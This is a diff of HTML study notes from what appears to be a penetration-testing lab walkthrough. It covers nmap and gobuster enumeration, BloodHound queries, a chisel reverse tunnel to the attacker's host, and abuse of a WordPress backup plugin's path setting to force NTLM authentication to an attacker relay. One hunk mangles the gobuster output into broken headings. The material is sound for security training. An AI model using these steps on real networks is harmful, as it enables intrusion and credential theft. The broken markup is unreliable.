@@ -139,57 +139,56 @@ Nmap done: 1 IP address (1 host up) scanned in 31.38 seconds
 <p>This is not surprising given the hostname, MAILSRV1.</p>
 <p><em>In a real-world penetration test, the hostnames may not always be as descriptive as they are in this Module.</em></p>
 <p>We may not be familiar with hMailServer, so we can research it.  It&#39;s web page states it&#39;s a free open source email server for MS Windows.</p>
-<p>We can search for CVEs and public exploits, but as Namp did not discover the version number we need to conduct a broader search, which only turns up older results in this case.</p>
-<!-- ![99684678161d6071a40af92148e6bb39.png](assets/static/resources/99684678161d6071a40af92148e6bb39.png) -->
-
+<p>We can search for CVEs and public exploits, but as Namp did not discover the version number we need to conduct a broader search, which only turns up older results in this case.
+<img src="../_resources/99684678161d6071a40af92148e6bb39.png" alt="99684678161d6071a40af92148e6bb39.png"></p>
 <p><em>Even if we had found a vulnerability with a matching exploit providing the code execution, we should not skip the remaining enumeration steps. While we may get access to the target system, we could potentially miss out on vital data or information for other services and systems.</em></p>
 <p>Next we enum the IIS web server, start by browsing to the page.
-<img src="assets/static/resources/4316651448cd222db1ee56d6a44fcad9.png" alt="4316651448cd222db1ee56d6a44fcad9.png"></p>
+<img src="../_resources/4316651448cd222db1ee56d6a44fcad9.png" alt="4316651448cd222db1ee56d6a44fcad9.png"></p>
 <ul>
 <li>We find only the default IIS welcome page.</li>
 </ul>
-<p>Let&#39;s use <code>gobuster</code> to try to enum directories and files.  Enter <code>dir</code> to use the directory enumeration mode, <code>-u</code> for URL, <code>-w</code> for wordlist, and <code>-x</code> for the files types we want to identify.  In this case, we will look for <code>txt,pdf,config</code> to identify any documents or config files.  Use <code>-o</code> to create an output file.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/beyond]
-└─$ gobuster dir -u http://192.168.218.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://192.168.218.242
+<h1>Let&#39;s use <code>gobuster</code> to try to enum directories and files.  Enter <code>dir</code> to use the directory enumeratino mode, <code>-u</code> for URL, <code>-w</code> for wordlist, and <code>-x</code> for the files types we want to identify.  In this case, we will look for <code>txt,pdf,config</code> to identify any documents or config files.  Use <code>-o</code> to create an output file.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ gobuster dir -u <a href="http://192.168.218.242">http://192.168.218.242</a> -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config</h1>
+<h1>Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</h1>
+<h1>[+] Url:                     <a href="http://192.168.218.242">http://192.168.218.242</a>
 [+] Method:                  GET
 [+] Threads:                 10
 [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
 [+] Negative Status codes:   404
 [+] User Agent:              gobuster/3.6
 [+] Extensions:              pdf,config,txt
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-Progress: 18456 / 18460 (99.98%)
-===============================================================
-Finished
-===============================================================
-</code></pre>
-<ul>
-<li>Gobuster did not turn up anything notable.</li>
-<li><em>Not every enumeration technique needs to provide actionable results. In the initial information gathering phase, it is important to perform a variety of enumeration methods to get a complete picture of a system.</em>.</li>
-</ul>
-<p>To summarize our enumeration of MAILSRV1:</p>
-<ul>
-<li>Port scan with Namp.</li>
-<li>IIS web server.</li>
-<li>HMailServer.</li>
-<li>Windows OS.</li>
-<li>Further web server enumeration did not turn up anything notable.</li>
-</ul>
-<p>If we identify valid credentials and targets later in the test we may be able to utilize the mail server, perhaps for phishing.</p>
-<p>The cyclical nature of the pentest is important for us to grasp, we must be in the mindset of continuously reevaluating and using new info to follow previously inapproachable attack vectors.</p>
-<h5>WEBSRV1</h5>
-<p>Now we wil enumerate the second machine in the client topology, WEBSRV1, which we can assume is a web server.</p>
-<p><em>In a real penetration test, we could scan MAILSRV1 and WEBSRV1 in a parallel fashion. Meaning, that we could perform the scans at the same time to save valuable time for the client. If we do so, it&#39;s vital to perform the scans in a structured way to not mix up results or miss findings.</em></p>
-<p>Start with an Namp scan.</p>
-<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
+[+] Timeout:                 10s</h1>
+<h1>Starting gobuster in directory enumeration mode</h1>
+<h1>Progress: 18456 / 18460 (99.98%)</h1>
+<h1>Finished</h1>
+<pre><code>- Gobuster did not turn up anything notable.
+ - *Not every enumeration technique needs to provide actionable results. In the initial information gathering phase, it is important to perform a variety of enumeration methods to get a complete picture of a system.*.
+
+To summarize our enumeration of MAILSRV1:
+- Port scan with Namp.
+ - IIS web server.
+ - HMailServer.
+ - Windows OS.
+- Further web server enumeration did not turn up anything notable.
+
+If we identify valid credentials and targets later in the test we may be able to utilize the mail server, perhaps for phishing.
+
+The cyclical nature of the pentest is important for us to grasp, we must be in the mindset of continuously reevaluating and using new info to follow previously inapproachable attack vectors.
+
+
+
+##### WEBSRV1
+
+Now we wil enumerate the second machine in the client topology, WEBSRV1, which we can assume is a web server.
+
+*In a real penetration test, we could scan MAILSRV1 and WEBSRV1 in a parallel fashion. Meaning, that we could perform the scans at the same time to save valuable time for the client. If we do so, it&#39;s vital to perform the scans in a structured way to not mix up results or miss findings.*
+
+Start with an Namp scan.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ sudo nmap -sC -sV -oN websrv1/nmap 192.168.218.244
 [sudo] password for operator:
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-28 22:26 PST
@@ -218,12 +217,12 @@ Nmap done: 1 IP address (1 host up) scanned in 13.94 seconds
 <p>We are only able to perform a password attack on port 22, but we don&#39;t have any usernames or passwords yet so we analyze other services first.  We have Apache 2.4.52 running on port 80.</p>
 <p><em>We should also search for potential vulnerabilities in Apache 2.4.52 as we did for hMailServer. As this will yield no actionable results, we&#39;ll skip it.</em></p>
 <p>We begin by browsing to the webpage, the Nmap scan returned the HTTP title BEYOND Finance so we should find a non-default page.
-<img src="assets/static/resources/d79fb1b122967e1df5ccb258d137ff91.png" alt="d79fb1b122967e1df5ccb258d137ff91.png"></p>
+<img src="../_resources/d79fb1b122967e1df5ccb258d137ff91.png" alt="d79fb1b122967e1df5ccb258d137ff91.png"></p>
 <ul>
 <li>We find a basic company web page.</li>
 </ul>
 <p>At first glance there is no menu bar and there doesn&#39;t appear to be anything actionable.  Let&#39;s inspect the page source code to determine the underlying technology.  We can find artifacts and strings indicating the framework, solution, or CMS in use.
-<img src="assets/static/resources/d8a98d80dbe4df24409b0e83009ec511.png" alt="d8a98d80dbe4df24409b0e83009ec511.png"></p>
+<img src="../_resources/d8a98d80dbe4df24409b0e83009ec511.png" alt="d8a98d80dbe4df24409b0e83009ec511.png"></p>
 <p>The presence of strings &quot;wp-content&quot; and &quot;wp-include&quot; indicate the site is running WordPress.  We can confirm by using <code>whatweb</code>.</p>
 <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ whatweb http://192.168.247.244
@@ -1316,7 +1315,7 @@ There may be a short delay until the server is ready.
 </ul>
 <pre><code>MATCH (m:Computer) RETURN m
 </code></pre>
-<p><img src="assets/static/resources/e53a91823062abad4be1695b133c19cc.png" alt="e53a91823062abad4be1695b133c19cc.png"></p>
+<p><img src="../_resources/e53a91823062abad4be1695b133c19cc.png" alt="e53a91823062abad4be1695b133c19cc.png"></p>
 <ul>
 <li>We have 4 computer objects in the domain.</li>
 <li>Click on the nodes to obtain additional info about the computer objects.</li>
@@ -1353,7 +1352,7 @@ MARCUS
 </ul>
 <p>To use some of BloodHound&#39;s pre-built queries we can mark <code>marcus</code> (interactive shell) and <code>john</code> (valid creds) as owned.  Right click on the respective objects and mark as &quot;Owned&quot;.</p>
 <p>Display all domain admins with the pre-built &quot;Find all Domain Admins&quot; query under &quot;Analysis&quot;.
-<img src="assets/static/resources/efde744e9c60c759469cce9b069cc86d.png" alt="efde744e9c60c759469cce9b069cc86d.png"></p>
+<img src="../_resources/efde744e9c60c759469cce9b069cc86d.png" alt="efde744e9c60c759469cce9b069cc86d.png"></p>
 <ul>
 <li>Aside from <code>Administrator</code>, <code>beccy</code> is a member of Domain Admins group.</li>
 </ul>
@@ -1380,7 +1379,7 @@ Although they returned no results, the pre-built queries are a quick and powerfu
 <p>The relationship for this case is <code>[:HasSession]</code>, the first node specified by a property is <code>(c:Computer)</code>, and the second is <code>(m:User)</code>.  Meaning the edge between the two nodes source is the computer object.  We&#39;ll use <code>p</code> to store and display the data.</p>
 <pre><code>MATCH p = (c:Computer)-[:HasSession]-&gt;(m:User) RETURN p
 </code></pre>
-<p><img src="assets/static/resources/3bfbfb23582551875d2c6cf2272f53c9.png" alt="3bfbfb23582551875d2c6cf2272f53c9.png"></p>
+<p><img src="../_resources/3bfbfb23582551875d2c6cf2272f53c9.png" alt="3bfbfb23582551875d2c6cf2272f53c9.png"></p>
 <ul>
 <li>Our query shows 3 active sessions.<ul>
 <li>CLIENTWK1 has an active session with user <code>marcus</code></li>
@@ -1397,13 +1396,13 @@ Although they returned no results, the pre-built queries are a quick and powerfu
 <li>This means local Administrator (indicated by RID 500) has an active session.</li>
 </ul>
 <p>The next step is to identify all <em>KERBEROASTABLE</em> users in the domain.  We can use pre-built <em>List all Kerberoastable Accounts</em> query.
-<img src="assets/static/resources/198de7cda1a7ad2ae9f7313b564488ed.png" alt="198de7cda1a7ad2ae9f7313b564488ed.png"></p>
+<img src="../_resources/198de7cda1a7ad2ae9f7313b564488ed.png" alt="198de7cda1a7ad2ae9f7313b564488ed.png"></p>
 <ul>
 <li>Apart from <code>krbtgt</code>, which is often an unfeasible vector, <code>daniela</code> is kerberoastable.</li>
 <li><em>The krbtgt user account acts as service account for the Key Distribution Center (KDC) and is responsible for encrypting and signing Kerberos tickets. When a domain is set up, a password is randomly generated for this user account, making a password attack unfeasible. Therefore, we can often safely skip krbtgt in the context of Kerberoasting.</em>.</li>
 </ul>
 <p>Examine the SPN of <code>daniela</code> in BloodHound from the Node Info menu by clicking on the node.
-<img src="assets/static/resources/c8609f1c2ae1777f3b7df679d8ac340b.png" alt="c8609f1c2ae1777f3b7df679d8ac340b.png"></p>
+<img src="../_resources/c8609f1c2ae1777f3b7df679d8ac340b.png" alt="c8609f1c2ae1777f3b7df679d8ac340b.png"></p>
 <ul>
 <li>The mapped SPN is <code>http/internalsrv1.beyond.com</code></li>
 <li>We can infer that a web server is running.</li>
@@ -1599,12 +1598,12 @@ chisel.exe client 192.168.45.163:8080 R:80:172.16.87.241:80
 <ul>
 <li>With chisel connected wr can browse to port 80 on 172.16.87.241 via port 81 of Kali localhost with Firefox.</li>
 </ul>
-<p><img src="assets/static/resources/b8f0104d9ecbbe285ea8dbfc861a4ad1.png" alt="b8f0104d9ecbbe285ea8dbfc861a4ad1.png"></p>
+<p><img src="../_resources/b8f0104d9ecbbe285ea8dbfc861a4ad1.png" alt="b8f0104d9ecbbe285ea8dbfc861a4ad1.png"></p>
 <ul>
 <li>We find an internal wordpress instance on INTERNALSRV1.</li>
 </ul>
 <p>Browse to the login page at <code>http://127.0.0.1/wordpress/wp-admin</code> and try to log in with the creds we discovered.
-<img src="assets/static/resources/997c101adee6da93803ce658c1d73f40.png" alt="997c101adee6da93803ce658c1d73f40.png"></p>
+<img src="../_resources/997c101adee6da93803ce658c1d73f40.png" alt="997c101adee6da93803ce658c1d73f40.png"></p>
 <ul>
 <li>The nav bar shows a redirect to <code>internalsrv1.beyond.com</code></li>
 <li>Indicating a DNS name set within the domain.</li>
@@ -1622,7 +1621,7 @@ ff02::2 ip6-allrouters
 127.0.0.1               internalsrv1.beyond.com
 </code></pre>
 <p>We can now access <code>/wp-admin</code>.
-<img src="assets/static/resources/dfacbae52347802d192b900c12b52cf8.png" alt="dfacbae52347802d192b900c12b52cf8.png"></p>
+<img src="../_resources/dfacbae52347802d192b900c12b52cf8.png" alt="dfacbae52347802d192b900c12b52cf8.png"></p>
 <ul>
 <li>We try to log in with the creds we gathered so far as well as common pairs.</li>
 <li>I.e.- <code>admin:admin</code></li>
@@ -1743,26 +1742,26 @@ Stopped: Sat Dec 30 15:33:10 2023
 <li><em>We already established that no domain user has local Administrator privileges on any domain computers and we cannot use RDP to log in to them. However, we may be able to use protocols such as WinRM to access other systems.</em>.</li>
 </ul>
 <p>Now we can try to login at <code>/wp-admin</code> through our port forward.
-<img src="assets/static/resources/a0951af7b0c0bfb3363dd87066037791.png" alt="a0951af7b0c0bfb3363dd87066037791.png"></p>
+<img src="../_resources/a0951af7b0c0bfb3363dd87066037791.png" alt="a0951af7b0c0bfb3363dd87066037791.png"></p>
 <ul>
 <li>We have successfully gained access to the WP instance as <code>daniela</code></li>
 </ul>
 <h5>Abuse a WordPress Plugin for a Relay Attack</h5>
 <p>Now that we have gained access to the WP dashboard, we can review the settings and plugins.</p>
 <p>Starting with users:
-<img src="assets/static/resources/f0c632ee39f8ec64b00ab95e0be57f1d.png" alt="f0c632ee39f8ec64b00ab95e0be57f1d.png"></p>
+<img src="../_resources/f0c632ee39f8ec64b00ab95e0be57f1d.png" alt="f0c632ee39f8ec64b00ab95e0be57f1d.png"></p>
 <ul>
 <li><code>daniela</code> is the only user.</li>
 </ul>
 <p>Next we check <code>Settings &gt; General</code>.
-<img src="assets/static/resources/dfd3fcb0364a49d682aec56dd1600725.png" alt="dfd3fcb0364a49d682aec56dd1600725.png"></p>
+<img src="../_resources/dfd3fcb0364a49d682aec56dd1600725.png" alt="dfd3fcb0364a49d682aec56dd1600725.png"></p>
 <p>The WordPress Address (URL) and Site Address (URL) are DNS names as we had assumed.  All other settings are mostly default, so we review installed plugins.
-<img src="assets/static/resources/56a327be48cfed2c102b96750338e2ca.png" alt="56a327be48cfed2c102b96750338e2ca.png"></p>
+<img src="../_resources/56a327be48cfed2c102b96750338e2ca.png" alt="56a327be48cfed2c102b96750338e2ca.png"></p>
 <ul>
 <li>Of the 3 plugins only <a href="https://wordpress.org/plugins/backup-backup/">Backup Migration</a></li>
 <li>Click &quot;Manage&quot;.</li>
 <li>Clicking through menus and settings we disconver the Backup dir path.
-<img src="assets/static/resources/49be3d5c8c95f88a7e90070eaf12a73a.png" alt="49be3d5c8c95f88a7e90070eaf12a73a.png"></li>
+<img src="../_resources/49be3d5c8c95f88a7e90070eaf12a73a.png" alt="49be3d5c8c95f88a7e90070eaf12a73a.png"></li>
 <li>Backup path <code>C:\xampp\htdocs\wordpress\wp-content\backup-migration-BV1emzfHrI</code></li>
 <li>We can enter a path in this field, we may be able to abuse this functionality to force auth of the underlying system.</li>
 </ul>
@@ -1835,7 +1834,7 @@ listening on [any] 9999 ...
 </code></pre>
 <p>With everything setup we can modify the Backup directory path.</p>
 <p>Set the path to the URI reference <code>//192.168.45.163/test</code> where the IP is our Kali machine and <code>/test</code> is a nonexistent path.
-<img src="assets/static/resources/156b67d1d13a6a7b87d4587904efcffa-1.png" alt="156b67d1d13a6a7b87d4587904efcffa.png"></p>
+<img src="../_resources/156b67d1d13a6a7b87d4587904efcffa-1.png" alt="156b67d1d13a6a7b87d4587904efcffa.png"></p>
 <ul>
 <li>Once entered scroll down and click Save.</li>
 <li>This causes the WP plugin to auth to our <code>impacket-ntlmrelayx</code> in the context of the user running WP.</li>
